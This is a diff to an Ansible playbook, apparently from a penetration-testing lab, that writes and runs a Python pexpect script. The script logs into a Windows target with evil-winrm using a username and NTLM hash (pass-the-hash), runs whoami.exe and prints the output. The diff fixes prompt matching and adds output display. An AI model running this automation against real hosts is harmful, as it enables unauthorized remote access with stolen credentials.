@@ -4,6 +4,7 @@
     dest: /opt/winrm.py
     content: |
       import pexpect
+      import re
 
       target_ip = "{{ target_ip }}"
       username = "{{ username }}"
@@ -11,13 +12,16 @@
 
       command = f"evil-winrm -i {target_ip} -u {username} -H {hash}"
 
+      winrm='PS \x1b[0mC:\\Users\\Administrator\\Documents> '
       child = pexpect.spawn(command)
       child.timeout = None
-      child.expect(r"PS C:\\Users\\Administrator\\Documents> ")
+      child.expect(re.escape(winrm))
       child.sendline("whoami.exe")
-      child.expect(r"PS C:\\Users\\Administrator\\Documents> ")
+      child.expect(re.escape(winrm))
       child.sendline("exit")
       child.interact()
+      res = child.before + child.after
+      print(res)
 
 - name: Make thescript executable
   file:
@@ -26,3 +30,9 @@
 
 - name: Run the evil-winrm
   shell: python3 /opt/winrm.py
+  register: winrm_output
+
+
+- name: Display the output
+  debug:
+    msg: "{{ winrm_output.stdout }}"
